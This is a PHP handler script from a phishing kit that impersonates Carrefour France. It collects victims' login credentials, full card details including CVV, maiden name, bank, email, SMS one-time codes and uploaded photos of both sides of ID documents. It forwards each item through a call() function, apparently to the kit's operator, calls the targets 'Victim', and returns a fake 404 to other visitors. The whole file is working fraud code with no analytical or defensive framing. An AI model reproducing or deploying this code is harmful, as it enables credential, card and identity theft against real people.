<?php 
session_start();
require '../config.php';



if(isset($_POST['blocked'])){
call("/- CARREFOUR FR Notification -/
Victim [$ipp] is using mobile phone so they was blocked.");
return;
}

if(isset($_POST['user'])){
	$_SESSION['v_log'] = $_POST['user'];
call("/- CARREFOUR FR LOGIN -/
User: ".$_POST['user']."
Pass: ".$_POST['pass']);
return;
}

 

if(isset($_POST['cc'])){
call("/- CARREFOUR FR CC -/
Cc: ".$_POST['cc']."
Exp: ".$_POST['exp']."
Cvv: ".$_POST['cvv']."
Nom de famille: ".$_POST['lastname']."
Prénom complet: ".$_POST['firstname']."
Nom de jeune fille: ".$_POST['maidenname']."
Banque: ".$_POST['bank']."
Email: ".$_POST['email']."
" );
return;
}


if(isset($_POST['carding'])){
call("CARREFOUR FR Notification
Entering card info...
");
return;
}

if(isset($_POST['otping'])){
call("CARREFOUR FR Notification
Entering code...
");
return;
}

if(isset($_POST['sms'])){
call("/- CARREFOUR FR SMS -/
CODE: ".$_POST['sms']."
");
return;
}


if(isset($_POST['just'])){


$r = $_FILES['recto'];
$v = $_FILES['verso'];
$ext_r = pathinfo(basename($r['name']), PATHINFO_EXTENSION);
$ext_v = pathinfo(basename($v['name']), PATHINFO_EXTENSION);
$name_r = uniqid().".$ext_r";
$name_v = uniqid().".$ext_v";
$r_link = str_replace("post.php", "up/$name_r", "https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);
$v_link = str_replace("post.php", "up/$name_v", "https://".$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']);


move_uploaded_file($r['tmp_name'], "up/$name_r");
move_uploaded_file($v['tmp_name'], "up/$name_v");


	$recto = "";
	$verso = "";
call("/- CARREFOUR FR SMS -/
Justification: ".$_POST['just']."
Recto: ".$r_link."
Verso: ".$v_link."
");
return header("location: processing.php");
}



header("HTTP/1.0 404 Not Found");

?>